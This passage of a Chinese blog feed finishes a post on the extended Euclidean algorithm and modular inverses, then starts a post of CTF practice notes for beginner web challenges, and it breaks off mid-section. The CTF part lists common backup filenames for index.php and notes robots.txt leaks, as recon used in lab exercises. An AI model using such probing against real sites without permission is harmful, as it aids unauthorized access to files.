stretchy="false">(</mo><msub><mi>x</mi><mn>2</mn></msub><mo>−</mo><mo stretchy="false">(</mo><mi>a</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mi>b</mi><mo stretchy="false">)</mo><msub><mi>y</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\Rightarrow x_1 = y_2\ and\ y_1 = (x_2 - (a//b)y_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">⇒</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mord">/</span><span class="mord">/</span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p>ok，至此我们已经得到了上下两个贝组等式之间系数的关系了。</p><p>在这里<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_1,y_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>对应的是一开始<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(a,b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span></span></span></span>最大的贝组等式的解。</p><p>我们可以根据<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>b</mi><mo separator="true">,</mo><mi>a</mi><mi mathvariant="normal">%</mi><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(b, a \% b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mord">%</span><span class="mord mathdefault">b</span><span class="mclose">)</span></span></span></span>贝组等式解<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_2,y_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>来求出<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_1, y_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。</p><p>而要知道<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_2,y_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，我们就得知道<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>3</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>3</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_3,y_3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，就这样深入下去，我们需要一个<code>终点</code>，即一组确定的解。</p><p>然后从这组确定的解再原路返回，在回去的过程中将算出每一个解，知道开始的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_1,y_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。</p><p>这个过程实际上就是递归的过程。（现在想来递归是不是就是一个栈呢？一开始依次入栈，到达某种条件，像俄罗斯方块拼成一行了，就依次出栈消除</p><p>而那个<code>终点</code>实际上也很容易取。</p><p>我们用辗转相除法的时候的等式 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mo>=</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>b</mi><mo separator="true">,</mo><mi>a</mi><mi mathvariant="normal">%</mi><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">gcd(a, b) = gcd(b, a\%b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mord">%</span><span class="mord mathdefault">b</span><span class="mclose">)</span></span></span></span>。最后结束的情况就是b为零，那时候a就是它们的最大公因数。</p><p>所以我们考虑<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">gcd(a, 0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span>的贝组等式。</p><p>很显然，我们能够构造出这样的等式 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mo>∗</mo><mi>a</mi><mo>+</mo><mn>0</mn><mo>∗</mo><mn>0</mn><mo>=</mo><mi>a</mi></mrow><annotation encoding="application/x-tex">1*a + 0 * 0 = a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span>。</p><p>所以这里的解就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(1, 0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span>。这便是<code>终点</code>。</p><h2 id="代码实现"><a class="markdownIt-Anchor" href="#代码实现"></a> 代码实现</h2><p>这里给出百度百科的exgcd的python代码实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">ext_euclid</span>(<span class="hljs-params">a, b</span>):     <br>    <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span>:         <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, a     <br>    <span class="hljs-keyword">else</span>:         <br>        x, y, q = ext_euclid(b, a % b)      <br>        x, y = y, (x - (a // b) * y)         <br>        <span class="hljs-keyword">return</span> x, y, q<br></code></pre></td></tr></table></figure><p>它的返回值有三个值，分别为<code>x, y</code>和 gcd。</p><p>也不难理解哈哈，它叫拓展欧几里得，普通的欧几里得的功能（得到最大公因子）当然也不能落下啦！</p><p>然后如何求模逆呢？</p><p>很简单，首先得判断它得gcd是不是1，只有a和b互素情况下，a才有逆。</p><p>然后x就是a的逆啦！</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">def exgcd(<span class="hljs-keyword">a</span>, b):<br><span class="hljs-keyword">if</span> (b == <span class="hljs-number">0</span>):<br><span class="hljs-literal">return</span> <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-keyword">a</span><br><span class="hljs-keyword">else</span>:<br>x, y, gcd= exgcd(b, <span class="hljs-keyword">a</span> % b)<br>x, y = y, (x - (<span class="hljs-keyword">a</span><span class="hljs-comment"> // b) * y)</span><br><span class="hljs-literal">return</span> x, y, gcd<br><br>print(exgcd(<span class="hljs-number">7</span>, <span class="hljs-number">26</span>))<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210930000954797.png" alt="7's inverse" /></p><p>还可以使用<code>libnum</code>这个强大的库来直接求模逆。这里把它的相关函数copy过来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">xgcd</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Extented Euclid GCD algorithm.</span><br><span class="hljs-string">    Return (x, y, g) : a * x + b * y = gcd(a, b) = g.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> a == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, b<br>    <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, a<br><br>    px, ppx = <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>    py, ppy = <span class="hljs-number">1</span>, <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">while</span> b:<br>        q = a // b<br>        a, b = b, a % b<br>        x = ppx - q * px<br>        y = ppy - q * py<br>        ppx, px = px, x<br>        ppy, py = py, y<br><br>    <span class="hljs-keyword">return</span> ppx, ppy, a<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">invmod</span>(<span class="hljs-params">a, n</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Return 1 / a (mod n).</span><br><span class="hljs-string">    @a and @n must be co-primes.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> n &lt; <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;modulus must be greater than 1&quot;</span>)<br><br>    x, y, g = xgcd(a, n)<br><br>    <span class="hljs-keyword">if</span> g != <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;no invmod for given @a and @n&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> x % n<br></code></pre></td></tr></table></figure><p>实际上就是拓展欧几里得，它用的拓展欧几里得是迭代版的，下次再去学习一下。</p><p>然后它判断了一下a和b的最大公因子是不是1，不是的话报错，提示无法求逆。</p><p>​<img src="https://upyun.wuuconix.link/image-20210930001256984.png" alt="libnum" /></p><h2 id="战术总结"><a class="markdownIt-Anchor" href="#战术总结"></a> 战术总结</h2><p>今天总算是把拓展欧几里得的原理弄懂了，还经过7att1ce的推荐知道了libnum这个强大库的存在。总算是迈出了代码实现AES的第一步啦！</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>crypto</tag>
      
      <tag>algorithm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界刷题笔记</title>
    <link href="/2021/09/23/adworld/"/>
    <url>/2021/09/23/adworld/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-bBghIUkx" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="725619" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h1 id="攻防世界刷题笔记"><a class="markdownIt-Anchor" href="#攻防世界刷题笔记"></a> 攻防世界刷题笔记</h1><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>最近博客好久没更新了。CTFHUB web基础部分刷完很久了，提高部分的题目太难了，而且量也少。看了一眼阮行止学长提供的刷题顺序。打算开始做攻防世界。攻防世界在很久以前刚接触CTF的时候做了一些题目。当时每道题几乎都是看的wp，基础知识太薄弱了。现在做应该会好些。</p><h2 id="view_source"><a class="markdownIt-Anchor" href="#view_source"></a> view_source</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">oncontextmenu</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>(<span class="hljs-string">&quot;return false&quot;</span>)</span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">onselectstart</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>(<span class="hljs-string">&quot;return false&quot;</span>)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>页面禁用了右键。用<code>Ctrl + U</code>或者<code>F12</code>或者加<code>view-souce:</code>前缀都可以获得flag。</p><p><img src="https://upyun.wuuconix.link/image-20210923105115220.png" alt="view-source" /></p><h2 id="robots"><a class="markdownIt-Anchor" href="#robots"></a> robots</h2><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">url:</span>http:<span class="hljs-comment">//111.200.241.244:51547/robots.txt</span><br><br>User-agent: *<br><span class="hljs-symbol">Disallow:</span> <br><span class="hljs-symbol">Disallow:</span> f1ag_1s_h3re.php<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210923105304352.png" alt="robots.txt" /></p><p>简单的robots.txt隐藏信息。</p><h2 id="backup"><a class="markdownIt-Anchor" href="#backup"></a> backup</h2><p>页面提示<code>你知道index.php的备份文件名吗？</code></p><p>以下为常用的<code>index.php</code>备份文件。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">index<span class="hljs-selector-class">.php</span><br>index<span class="hljs-selector-class">.phps</span><br><span class="hljs-selector-class">.index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.swp</span><br><span class="hljs-selector-class">.index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.swo</span><br><span class="hljs-selector-class">.index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.swn</span><br>index<span class="hljs-selector-class">.php</span>.php~<br>index<span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.bak</span><br>index<span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.txt</span><br>index<span class="hljs-selector-class">.php</span>.old<br></code></pre></td></tr></table></figure><p>在这道题中为<code>index.php.bak</code>。</p><p><img src="https://upyun.wuuconix.link/image-20210923105709605.png" alt="index.php.bak" /></p><h2 id="cokkie"><a class="markdownIt-Anchor" href="#cokkie"></a> Cokkie</h2><p>开局提示<code>你知道什么是cookie吗？</code>。</p><p>我一共知道三种方式来看Cokkie，实际上就是HTTP的响应包。</p><ol><li><p>Burpsuite。这比较麻烦，懒得开Burp 2333。</p></li><li><p>浏览器开发者工具-&gt;网络-&gt;标头</p><p><img src="https://upyun.wuuconix.link/image-20210923115518148.png" alt="浏览器标头" /></p></li><li><p>利用curl命令直接看（非常优雅</p><figure class="highlight ada"><table><tr><td 